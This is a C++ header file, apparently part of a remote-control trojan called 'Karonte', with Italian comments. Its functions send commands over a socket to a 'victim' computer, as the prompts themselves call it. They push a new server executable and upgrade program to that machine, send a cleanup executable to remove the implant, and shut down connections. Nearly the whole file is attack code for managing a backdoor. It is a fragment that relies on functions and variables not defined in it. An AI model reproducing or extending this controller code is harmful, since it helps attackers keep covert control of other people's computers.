/* 
 * File:   CloseFunction.h
 * Author: redo86
 *
 * Created on 3 luglio 2010, 22.26
 */

#ifndef CLOSEFUNCTION_H
#define	CLOSEFUNCTION_H



#endif	/* CLOSEFUNCTION_H */
#include <iostream>
using namespace std;

#define SERVERNAME "karonte.exe"
#define UPGRADE "upgrade.exe"
#define CLEANALL "CleanAll.exe"

//dichiarazione funzioni
void Outdos(string);
void CloseUser(string);
void InitCloseUser(int);
void Shutdown(string);
void Upgrade(string);
void CloseUserFinal(void);

void Outdos(string cmd){
     char fuck;
     cout<<"Chiudere Karonte su computer vittima?  (S/N): ";
     while(1){

          fuck=getchar();
          cout<<endl;
          if(fuck=='s' || fuck=='S'){send(cl_sk,cmd.c_str(),cmd.size(),0);exit(0);}
          if(fuck=='n' || fuck=='N')break;
          cout<<"SE CE\' SCRITTO S/N UN POI PIGIA\' COSA TI PARE"<<endl;
          cout<<"RIPROVA (S/N): ";

     }
     cout<<endl;
	 return;

}

void CloseUser(string cmd){

     send(cl_sk,cmd.c_str(),cmd.size(),0);

     chdir("..");
     chdir("..");
     close(cl_sk);
     close(sk);
     cout<<endl<<"Chiusura terminata"<<endl<<"Premere INVIO....";
     getchar();
     InitKaronte();
     return;
}

void CloseUserFinal(){
     chdir("..");
     chdir("..");
     close(cl_sk);
     close(sk);
     cout<<endl<<"Chiusura terminata, Karonte eliminato dal computer remoto"<<endl<<endl;
     sleep(2);
     exit(0);
}

void InitCloseUser(int p){
    cout<<endl<<"Chiusura in corso.."<<endl;
    sleep(1);
    exit(0);
   
}

void Shutdown(string cmd){

     char fuck;
     char ok;
     char size[SIZE];
     int file_size;
     string upg=DirSettings + CLEANALL;

     cout<<"Sei sicuro di voler chiudere definitivamente il server??  (S/N): ";
     while(1){

          fuck=getchar();
          cout<<endl;
          if(fuck=='s' || fuck=='S'){

          //mando il programma per l'eliminazione di karonte
          /**********************************/
          file_size=FileSize(upg);      
          cout<<"Attendere prego"<<endl<<endl;

           //invio il comando "cleanall"
           send(cl_sk,cmd.c_str(),cmd.size(),0);
           //mando il file cleanall
           SendRemoteFile(upg,file_size);//mando il nuovo server
          /**********************************/
          
           CloseUserFinal();           
          }


          if(fuck=='n' || fuck=='N')break;
          cout<<"SE CE\' SCRITTO S/N UN POI PIGIA\' COSA TI PARE"<<endl;
          cout<<"RIPROVA (S/N): ";

     }

     cout<<endl;
     return;

}

void Upgrade(string cmd){
     char ok;
     char size[SIZE];
     long int file_size=FileSize(SERVERNAME);
     string upg=DirSettings + UPGRADE;
     if(file_size<=0){cout<<"Devi inserire il file "<<SERVERNAME<<" nella cartella base dell'user corrente; digitare viewdir per accedere."<<endl<<endl;return;}
     else cout<<"Attendere prego"<<endl<<endl;

     //invio il comando "upgrade"
     send(cl_sk,cmd.c_str(),cmd.size(),0);
     //mando il file upgrade
     SendRemoteFile(SERVERNAME,file_size);//mando il nuovo server
     recv(cl_sk,&ok,1,0);     
     SendRemoteFile(upg,file_size);//mando il file upgrade
     cout<<"Riavvio di Karonte in corso"<<endl<<endl;     
     chdir("..");
     chdir("..");
     close(cl_sk);
     close(sk);
     Menu();
     connectServer();
     InitUser();
     return;
/*
     SetCurrentDirectory("..");
     SetCurrentDirectory("..");
     closesocket(sock);
     Initial_User();
     return;*/

}
